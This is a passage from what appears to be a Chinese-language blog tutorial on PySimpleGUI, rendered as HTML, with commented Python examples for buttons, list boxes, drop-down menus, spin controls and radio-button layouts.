class=\"string\">&#x27;grey&#x27;</span>))</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-yellow-&#x27;</span>].update(button_color=(<span class=\"string\">&#x27;black&#x27;</span>,<span class=\"string\">&#x27;yellow&#x27;</span>))</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-red-&#x27;</span>].update(button_color=(<span class=\"string\">&#x27;black&#x27;</span>,<span class=\"string\">&#x27;grey&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;-red-&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-green-&#x27;</span>].update(button_color=(<span class=\"string\">&#x27;black&#x27;</span>,<span class=\"string\">&#x27;grey&#x27;</span>))</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-yellow-&#x27;</span>].update(button_color=(<span class=\"string\">&#x27;black&#x27;</span>,<span class=\"string\">&#x27;grey&#x27;</span>))</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-red-&#x27;</span>].update(button_color=(<span class=\"string\">&#x27;black&#x27;</span>,<span class=\"string\">&#x27;red&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"15列表元素的设定方法-py\"><a href=\"#15列表元素的设定方法-py\" class=\"headerlink\" title=\"15列表元素的设定方法.py\"></a>15列表元素的设定方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">列表元素的书写方法</span></span><br><span class=\"line\"><span class=\"string\">list=[&#x27;python&#x27;,&#x27;java&#x27;,&#x27;c++&#x27;,&#x27;php&#x27;,&#x27;html&#x27;]</span></span><br><span class=\"line\"><span class=\"string\">sg.Listbox(list)</span></span><br><span class=\"line\"><span class=\"string\">sg.LB(list)</span></span><br><span class=\"line\"><span class=\"string\">按键元素的设定方法</span></span><br><span class=\"line\"><span class=\"string\">sg.LB(list,size=(None,None))</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">list</span>=[<span class=\"string\">&#x27;python&#x27;</span>,<span class=\"string\">&#x27;java&#x27;</span>,<span class=\"string\">&#x27;c++&#x27;</span>,<span class=\"string\">&#x27;php&#x27;</span>,<span class=\"string\">&#x27;html&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">[sg.LB(<span class=\"built_in\">list</span>,</span><br><span class=\"line\">default_values=<span class=\"string\">&#x27;python&#x27;</span>, <span class=\"comment\"># 默认选中的值或者列表</span></span><br><span class=\"line\">key=<span class=\"string\">&#x27;-LB-&#x27;</span>,   <span class=\"comment\"># 元素的唯一标识符</span></span><br><span class=\"line\">select_mode=<span class=\"string\">&#x27;single&#x27;</span>,   <span class=\"comment\"># 选择模式，有效值包含如下4种：1.single，单选，更换时点击选择；2.multiple，可以多选，逐一点击选择；</span></span><br><span class=\"line\">                    <span class=\"comment\"># 3.browse，单选，鼠标按住也可以更换选择；4.extend,可以多选，鼠标按住也可以扩展选择</span></span><br><span class=\"line\">enable_events=<span class=\"literal\">True</span>, <span class=\"comment\">#  元素的事件属性，如果设定为True,元素列表项目被选中时会发生事件</span></span><br><span class=\"line\">bind_return_key=<span class=\"literal\">True</span>, <span class=\"comment\">#   绑定回车键，如果设定为True，回车键被按下时相当于此元素被点击</span></span><br><span class=\"line\">size=(<span class=\"number\">30</span>,<span class=\"number\">6</span>),   <span class=\"comment\"># 字符宽度，行高</span></span><br><span class=\"line\">disabled=<span class=\"literal\">False</span>, <span class=\"comment\"># 元素是否禁用</span></span><br><span class=\"line\">auto_size_text=<span class=\"literal\">None</span>,    <span class=\"comment\">#   如果为True,元素自动根据内容大小调整</span></span><br><span class=\"line\">font=<span class=\"literal\">None</span>,  <span class=\"comment\"># 设置字体名称或者大小</span></span><br><span class=\"line\">no_scrollbar=<span class=\"literal\">False</span>,     <span class=\"comment\">#  如果为True，则没有滚动条</span></span><br><span class=\"line\">background_color=<span class=\"literal\">None</span>,  <span class=\"comment\">#   背景颜色设定</span></span><br><span class=\"line\">text_color=<span class=\"literal\">None</span>,    <span class=\"comment\">#   字体颜色设定</span></span><br><span class=\"line\">pad=<span class=\"literal\">None</span>,   <span class=\"comment\"># 元素间隔设定</span></span><br><span class=\"line\">tooltip=<span class=\"literal\">None</span>,   <span class=\"comment\"># 悬浮文本</span></span><br><span class=\"line\">right_click_menu=<span class=\"literal\">None</span>,  <span class=\"comment\"># 右击调出菜单</span></span><br><span class=\"line\">visible=<span class=\"literal\">True</span>,   <span class=\"comment\"># 元素可见状态设定</span></span><br><span class=\"line\"></span><br><span class=\"line\">)]</span><br><span class=\"line\"></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,value=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"16列表元素的更新方法-py\"><a href=\"#16列表元素的更新方法-py\" class=\"headerlink\" title=\"16列表元素的更新方法.py\"></a>16列表元素的更新方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">列表元素的更新方法</span></span><br><span class=\"line\"><span class=\"string\">window[key].update()</span></span><br><span class=\"line\"><span class=\"string\">window[key].Update()</span></span><br><span class=\"line\"><span class=\"string\">values=None, # 元组或者列表，举例：values=[1,3], values=(1,3)</span></span><br><span class=\"line\"><span class=\"string\">disabled=None, #    bool: 更新元素是否禁用</span></span><br><span class=\"line\"><span class=\"string\">set_to_index=None, # 高亮显示设定的索引，Union[init,list,tuple]，举例：set_to_index=1, set_to_index=[1,2],set_to_index=(1,2),</span></span><br><span class=\"line\"><span class=\"string\">                    # 注意：单击只是高亮显示，并未选中。双击才是高亮显示+选中。单击获取值时，不用values(key)，而是window[key].get()</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">scroll_to_index=None,   # int：将设定的索引跳到要显示的第一行</span></span><br><span class=\"line\"><span class=\"string\">select_mode=None, # 选择模式，有效值包含如下4种：1.single，单选，更换时点击选择；2.multiple，可以多选，逐一点击选择；</span></span><br><span class=\"line\"><span class=\"string\">                    # 3.browse，单选，鼠标按住也可以更换选择；4.extend,可以多选，鼠标按住也可以扩展选择</span></span><br><span class=\"line\"><span class=\"string\">visible=True,   # 元素可见状态设定</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\">list1=[<span class=\"string\">&#x27;python&#x27;</span>,<span class=\"string\">&#x27;java&#x27;</span>,<span class=\"string\">&#x27;c++&#x27;</span>,<span class=\"string\">&#x27;php&#x27;</span>,<span class=\"string\">&#x27;html&#x27;</span>]</span><br><span class=\"line\">list2=[<span class=\"string\">&#x27;程序员无声&#x27;</span>,<span class=\"string\">&#x27;程序员大胖&#x27;</span>,<span class=\"string\">&#x27;程序员小肥&#x27;</span>,<span class=\"string\">&#x27;程序员不瘦&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">[sg.LB(list1,size=(<span class=\"number\">30</span>,<span class=\"number\">6</span>),key=<span class=\"string\">&#x27;-list-&#x27;</span>)],</span><br><span class=\"line\">[sg.B(<span class=\"string\">&#x27;编程语言&#x27;</span>),sg.B(<span class=\"string\">&#x27;程序员&#x27;</span>)],</span><br><span class=\"line\">[sg.B(<span class=\"string\">&#x27;set_to_index&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(event)</span><br><span class=\"line\">    key=<span class=\"string\">&#x27;-list-&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;程序员&#x27;</span>:</span><br><span class=\"line\">        window[key].update(values=list2)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;set_to_index&#x27;</span>:</span><br><span class=\"line\">        window[key].update(set_to_index=<span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(window[key].get())</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"17在窗口上调用字典里的键和值-py\"><a href=\"#17在窗口上调用字典里的键和值-py\" class=\"headerlink\" title=\"17在窗口上调用字典里的键和值.py\"></a>17在窗口上调用字典里的键和值.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">dict=&#123;&#x27;程序员无声&#x27;:&#x27;python&#x27;,&#x27;程序员大胖&#x27;:&#x27;java&#x27;,&#x27;程序员小肥&#x27;:&#x27;c++&#x27;,&#x27;程序员不瘦&#x27;:&#x27;php&#x27;&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"><span class=\"built_in\">dict</span>=&#123;<span class=\"string\">&#x27;程序员无声&#x27;</span>:<span class=\"string\">&#x27;python&#x27;</span>,<span class=\"string\">&#x27;程序员大胖&#x27;</span>:<span class=\"string\">&#x27;java&#x27;</span>,<span class=\"string\">&#x27;程序员小肥&#x27;</span>:<span class=\"string\">&#x27;c++&#x27;</span>,<span class=\"string\">&#x27;程序员不瘦&#x27;</span>:<span class=\"string\">&#x27;php&#x27;</span>&#125;</span><br><span class=\"line\"><span class=\"built_in\">list</span>=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">    <span class=\"built_in\">list</span>.append(i)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">list</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.LB(<span class=\"built_in\">list</span>,key=<span class=\"string\">&#x27;-LB-&#x27;</span>,size=(<span class=\"number\">30</span>,<span class=\"number\">6</span>),enable_events=<span class=\"literal\">True</span>)],</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;语言&#x27;</span>),sg.In(key=<span class=\"string\">&#x27;-YY-&#x27;</span>,size=(<span class=\"number\">25</span>))]</span><br><span class=\"line\"></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;-LB-&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-YY-&#x27;</span>].update(<span class=\"built_in\">dict</span>[values[<span class=\"string\">&#x27;-LB-&#x27;</span>][<span class=\"number\">0</span>]])</span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"18下拉菜单的设定方法-py\"><a href=\"#18下拉菜单的设定方法-py\" class=\"headerlink\" title=\"18下拉菜单的设定方法.py\"></a>18下拉菜单的设定方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">sg.Combo() or sg.InputCombo() or sg.DropDown() or sg.Drop()</span></span><br><span class=\"line\"><span class=\"string\">Combo和Listbox最大的区别在于，可以输入，但是不能多选。</span></span><br><span class=\"line\"><span class=\"string\">listbox取得的值是存放在列表里面，但是Combo取得的值是对象本身</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"><span class=\"built_in\">list</span>=[<span class=\"string\">&#x27;python&#x27;</span>,<span class=\"string\">&#x27;java&#x27;</span>,<span class=\"string\">&#x27;c++&#x27;</span>,<span class=\"string\">&#x27;php&#x27;</span>,<span class=\"string\">&#x27;html&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">[sg.Drop(<span class=\"built_in\">list</span>,</span><br><span class=\"line\">default_value=<span class=\"string\">&#x27;python&#x27;</span>, <span class=\"comment\"># 默认选中的值或者列表</span></span><br><span class=\"line\">key=<span class=\"literal\">None</span>,   <span class=\"comment\"># 元素的唯一标识符</span></span><br><span class=\"line\">enable_events=<span class=\"literal\">True</span>, <span class=\"comment\">#  元素的事件属性，如果设定为True,元素列表项目被选中时会发生事件</span></span><br><span class=\"line\">bind_return_key=<span class=\"literal\">True</span>, <span class=\"comment\">#   绑定回车键，如果设定为True，回车键被按下时相当于此元素被点击</span></span><br><span class=\"line\">size=(<span class=\"number\">30</span>,<span class=\"number\">6</span>),   <span class=\"comment\"># 字符宽度，行高</span></span><br><span class=\"line\">disabled=<span class=\"literal\">False</span>, <span class=\"comment\"># 元素是否禁用</span></span><br><span class=\"line\">auto_size_text=<span class=\"literal\">None</span>,    <span class=\"comment\">#   如果为True,元素自动根据内容大小调整</span></span><br><span class=\"line\">font=<span class=\"literal\">None</span>,  <span class=\"comment\"># 设置字体名称或者大小</span></span><br><span class=\"line\">background_color=<span class=\"literal\">None</span>,  <span class=\"comment\">#   背景颜色设定</span></span><br><span class=\"line\">text_color=<span class=\"literal\">None</span>,    <span class=\"comment\">#   字体颜色设定</span></span><br><span class=\"line\">pad=<span class=\"literal\">None</span>,   <span class=\"comment\"># 元素间隔设定</span></span><br><span class=\"line\">tooltip=<span class=\"literal\">None</span>,   <span class=\"comment\"># 悬浮文本</span></span><br><span class=\"line\">visible=<span class=\"literal\">True</span>,   <span class=\"comment\"># 元素可见状态设定</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"19下拉菜单的更新方法及小练习-py\"><a href=\"#19下拉菜单的更新方法及小练习-py\" class=\"headerlink\" title=\"19下拉菜单的更新方法及小练习.py\"></a>19下拉菜单的更新方法及小练习.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">window[key].update</span></span><br><span class=\"line\"><span class=\"string\">window[key].Update</span></span><br><span class=\"line\"><span class=\"string\">下拉菜单可更新的属性</span></span><br><span class=\"line\"><span class=\"string\">value=None, # 更新默认选中的选项</span></span><br><span class=\"line\"><span class=\"string\">values=None， #  更新显示的所有下拉菜单文本</span></span><br><span class=\"line\"><span class=\"string\">set_to_index=None, # 高亮显示设定的索引的文本</span></span><br><span class=\"line\"><span class=\"string\">disabled=None, # 更新元素的禁用状态</span></span><br><span class=\"line\"><span class=\"string\">readonly=None, # 更新元素是否可读</span></span><br><span class=\"line\"><span class=\"string\">font=None, #   更新元素的字体名称或者大小</span></span><br><span class=\"line\"><span class=\"string\">visible=None, # 定义元素为不可见</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"><span class=\"built_in\">dict</span>=&#123;<span class=\"string\">&#x27;程序员无声&#x27;</span>:<span class=\"string\">&#x27;python&#x27;</span>,<span class=\"string\">&#x27;程序员大胖&#x27;</span>:<span class=\"string\">&#x27;java&#x27;</span>,<span class=\"string\">&#x27;程序员小肥&#x27;</span>:<span class=\"string\">&#x27;c++&#x27;</span>,<span class=\"string\">&#x27;程序员不瘦&#x27;</span>:<span class=\"string\">&#x27;php&#x27;</span>&#125;</span><br><span class=\"line\"><span class=\"built_in\">list</span>=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">dict</span>:</span><br><span class=\"line\">    <span class=\"built_in\">list</span>.append(i)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">list</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.Combo(<span class=\"built_in\">list</span>,key=<span class=\"string\">&#x27;-LB-&#x27;</span>,size=(<span class=\"number\">30</span>,<span class=\"number\">6</span>),enable_events=<span class=\"literal\">True</span>)],</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;语言&#x27;</span>),sg.In(key=<span class=\"string\">&#x27;-YY-&#x27;</span>,size=(<span class=\"number\">25</span>))]</span><br><span class=\"line\"></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;-LB-&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-YY-&#x27;</span>].update(<span class=\"built_in\">dict</span>[values[<span class=\"string\">&#x27;-LB-&#x27;</span>]])</span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"20选择菜单和旋转按键-py\"><a href=\"#20选择菜单和旋转按键-py\" class=\"headerlink\" title=\"20选择菜单和旋转按键.py\"></a>20选择菜单和旋转按键.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">书写方法：sg.OptionMenu()</span></span><br><span class=\"line\"><span class=\"string\">此元素和设置了只读属性的ComboBox很像，它没有‘font’属性，不可以设定字体样式和大小</span></span><br><span class=\"line\"><span class=\"string\">没有‘enable_event’事件属性，不可以触发事件</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">选择菜单可设定的属性</span></span><br><span class=\"line\"><span class=\"string\">default_values=&#x27;python&#x27;, # 默认选中的值或者列表</span></span><br><span class=\"line\"><span class=\"string\">key=&#x27;-LB-&#x27;,   # 元素的唯一标识符</span></span><br><span class=\"line\"><span class=\"string\">size=(30,6),   # 字符宽度，行高</span></span><br><span class=\"line\"><span class=\"string\">disabled=False, # 元素是否禁用</span></span><br><span class=\"line\"><span class=\"string\">auto_size_text=None,    #   如果为True,元素自动根据内容大小调整</span></span><br><span class=\"line\"><span class=\"string\">background_color=None,  #   背景颜色设定</span></span><br><span class=\"line\"><span class=\"string\">text_color=None,    #   字体颜色设定</span></span><br><span class=\"line\"><span class=\"string\">pad=None,   # 元素间隔设定</span></span><br><span class=\"line\"><span class=\"string\">tooltip=None,   # 悬浮文本</span></span><br><span class=\"line\"><span class=\"string\">visible=True,   # 元素可见状态设定</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">选择菜单可更新的属性</span></span><br><span class=\"line\"><span class=\"string\">value=None, # 更新默认选中的元素</span></span><br><span class=\"line\"><span class=\"string\">values=None, # 更新所有显示的文本选项</span></span><br><span class=\"line\"><span class=\"string\">disabled=None, # 更新元素的禁用状态</span></span><br><span class=\"line\"><span class=\"string\">visible=None, # 更新元素的可见状态</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">旋转按钮</span></span><br><span class=\"line\"><span class=\"string\">书写方法：sg.Spin()</span></span><br><span class=\"line\"><span class=\"string\">特征：含有向上向下两个箭头按钮</span></span><br><span class=\"line\"><span class=\"string\">可设定的属性</span></span><br><span class=\"line\"><span class=\"string\">initial_value=&#x27;python&#x27;, # 默认选中的值或者列表</span></span><br><span class=\"line\"><span class=\"string\">key=&#x27;-LB-&#x27;,   # 元素的唯一标识符</span></span><br><span class=\"line\"><span class=\"string\">enable_events=True, #  元素的事件属性，如果设定为True,元素列表项目被选中时会发生事件</span></span><br><span class=\"line\"><span class=\"string\">size=(30,6),   # 字符宽度，行高</span></span><br><span class=\"line\"><span class=\"string\">disabled=False, # 元素是否禁用</span></span><br><span class=\"line\"><span class=\"string\">auto_size_text=None,    #   如果为True,元素自动根据内容大小调整</span></span><br><span class=\"line\"><span class=\"string\">font=None,  # 设置字体名称或者大小</span></span><br><span class=\"line\"><span class=\"string\">background_color=None,  #   背景颜色设定</span></span><br><span class=\"line\"><span class=\"string\">text_color=None,    #   字体颜色设定</span></span><br><span class=\"line\"><span class=\"string\">pad=None,   # 元素间隔设定</span></span><br><span class=\"line\"><span class=\"string\">tooltip=None,   # 悬浮文本</span></span><br><span class=\"line\"><span class=\"string\">visible=True,   # 元素可见状态设定</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">可更新的属性</span></span><br><span class=\"line\"><span class=\"string\">value=None, # 更新默认选中的元素</span></span><br><span class=\"line\"><span class=\"string\">values=None, # 更新所有显示的文本选项</span></span><br><span class=\"line\"><span class=\"string\">disabled=None, # 更新元素的禁用状态</span></span><br><span class=\"line\"><span class=\"string\">visible=None, # 更新元素的可见状态</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">a=[<span class=\"string\">&#x27;python&#x27;</span>,<span class=\"string\">&#x27;java&#x27;</span>,<span class=\"string\">&#x27;c++&#x27;</span>,<span class=\"string\">&#x27;php&#x27;</span>,<span class=\"string\">&#x27;html&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;OptionMenu&#x27;</span>),sg.OptionMenu(a,key=<span class=\"string\">&#x27;-OM-&#x27;</span>),</span><br><span class=\"line\">     sg.T(<span class=\"string\">&#x27;Spin&#x27;</span>),sg.Spin(a,key=<span class=\"string\">&#x27;-SP-&#x27;</span>,enable_events=<span class=\"literal\">True</span>)],</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;语言&#x27;</span>),sg.In(key=<span class=\"string\">&#x27;-YY-&#x27;</span>,size=(<span class=\"number\">25</span>))]</span><br><span class=\"line\"></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;-SP-&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-YY-&#x27;</span>].update(values[<span class=\"string\">&#x27;-SP-&#x27;</span>])</span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"21单选框的多种布局方法-py\"><a href=\"#21单选框的多种布局方法-py\" class=\"headerlink\" title=\"21单选框的多种布局方法.py\"></a>21单选框的多种布局方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">单选框的书写方法</span></span><br><span class=\"line\"><span class=\"string\">sg.Radio() or sg.R()</span></span><br><span class=\"line\"><span class=\"string\">举例：list=[&#x27;非常满意&#x27;,&#x27;满意&#x27;,&#x27;一般&#x27;,&#x27;不满意&#x27;]</span></span><br><span class=\"line\"><span class=\"string\">sg.R(i,group_id=1) for i in list</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">For循环快速定义单选框</span></span><br><span class=\"line\"><span class=\"string\">利用for循环从左向右遍历时</span></span><br><span class=\"line\"><span class=\"string\">layout=[[],[],[()for循环]] layout=[[]]+[[]]+[[()for循环]]</span></span><br><span class=\"line\"><span class=\"string\">利用for循环从上向下遍历时</span></span><br><span class=\"line\"><span class=\"string\">layout=[[]]+[[]]+[[]for循环]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">巧用key=(x,y), For循环快速定义单选框</span></span><br><span class=\"line\"><span class=\"string\">从左向右从上向下同时遍历</span></span><br><span class=\"line\"><span class=\"string\">layout=[[sg.R(x,group_id=y,key=(x,y)) for x in list] for y in range(9)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">lista=[<span class=\"string\">&#x27;非常满意&#x27;</span>,<span class=\"string\">&#x27;满意&#x27;</span>,<span class=\"string\">&#x27;一般&#x27;</span>,<span class=\"string\">&#x27;不满意&#x27;</span>]</span><br><span class=\"line\">listb=[<span class=\"string\">&#x27;请对程序员无声的课程内容做出评价：&#x27;</span>,<span class=\"string\">&#x27;请对程序员无声的讲解做出评价：&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># layout=[</span></span><br><span class=\"line\"><span class=\"comment\"># [sg.T(&#x27;1.&#x27;+listb[0])],</span></span><br><span class=\"line\"><span class=\"comment\"># [sg.R(i,group_id=1)for i in lista],</span></span><br><span class=\"line\"><span class=\"comment\"># [sg.T(&#x27;2.&#x27;+listb[1])],</span></span><br><span class=\"line\"><span class=\"comment\"># [sg.R(i,group_id=2)for i in lista]</span></span><br><span class=\"line\"><span class=\"comment\"># ]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># layout=[[sg.T(&#x27;1.&#x27;+listb[0])]]+[[sg.R(i,group_id=1)for i in lista]]\\</span></span><br><span class=\"line\"><span class=\"comment\">#        +[[sg.T(&#x27;2.&#x27;+listb[1])]]+[[sg.R(i,group_id=2)for i in lista]]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># layout=[</span></span><br><span class=\"line\"><span class=\"comment\">#     [[sg.R(i,group_id=1)]for i in lista]</span></span><br><span class=\"line\"><span class=\"comment\"># ]</span></span><br><span class=\"line\"></span><br><span class=\"line\">layout=[[sg.T(<span class=\"built_in\">str</span>(y+<span class=\"number\">1</span>))]+[sg.R(x,group_id=y,key=(x,y)) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> lista] <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"comment\"># if event == 